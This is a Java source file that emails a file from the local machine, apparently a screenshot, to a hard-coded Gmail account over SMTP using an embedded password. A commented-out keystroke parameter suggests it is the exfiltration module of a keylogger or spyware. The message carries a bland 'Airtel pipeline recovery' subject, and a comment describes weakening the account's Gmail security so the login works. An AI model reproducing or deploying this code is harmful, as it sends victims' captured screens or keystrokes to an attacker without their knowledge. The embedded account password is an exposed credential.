import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class MailSending {
	private static final String PASSWORD_GMAIL = "g8fgerzg5gz95gzrgg849841965ui rw894fdsf";
	private static final String OCTRONANONYMOUS_GMAIL_ID = "octronanonymous@gmail.com";

	/**
	 * working 11-01-2019 https://myaccount.google.com/lesssecureapps?pli=1 >>> to
	 * lower security gmail make it to false
	 * 
	 * @param keyStroke
	 */
	public static void sendToMailOriginal(String imagePath) {
		String to = OCTRONANONYMOUS_GMAIL_ID;

		String from = OCTRONANONYMOUS_GMAIL_ID;
		try {
			String host = "smtp.gmail.com";
			String d_port = "587";

			Properties properties = System.getProperties();

			properties.setProperty("mail.smtp.host", host);
			properties.put("mail.smtp.port", d_port);
			properties.put("mail.smtp.auth", "true");
			properties.put("mail.smtp.starttls.enable", "true");
			properties.put("mail.smtp.ssl.trust", "smtp.gmail.com");

			Session session = Session.getDefaultInstance(properties);
			MimeMessage message = new MimeMessage(session);
			message.setFrom(new InternetAddress(from));
			message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
			message.setSubject("Airtel pipeline recovery");

			// Create the message part
			BodyPart messageBodyPart = new MimeBodyPart();

			// Now set the actual message
			messageBodyPart.setText("This is message body");

			// Create a multipar message
			Multipart multipart = new MimeMultipart();

			// Set text message part
			multipart.addBodyPart(messageBodyPart);

			// Part two is attachment
			messageBodyPart = new MimeBodyPart();
			String filename = imagePath;
			DataSource source = new FileDataSource(filename);
			messageBodyPart.setDataHandler(new DataHandler(source));
			messageBodyPart.setFileName(filename);
			multipart.addBodyPart(messageBodyPart);

			// Send the complete message parts
			message.setContent(multipart);
//			message.setText(keyStroke);

			Transport transport = session.getTransport("smtp");
			transport.connect(host, Integer.valueOf(d_port).intValue(), OCTRONANONYMOUS_GMAIL_ID, PASSWORD_GMAIL);
			transport.sendMessage(message, message.getAllRecipients());
			transport.close();
			System.out.println("initialization OK");
		} catch (MessagingException mex) {
			mex.printStackTrace();
		}
	}
}
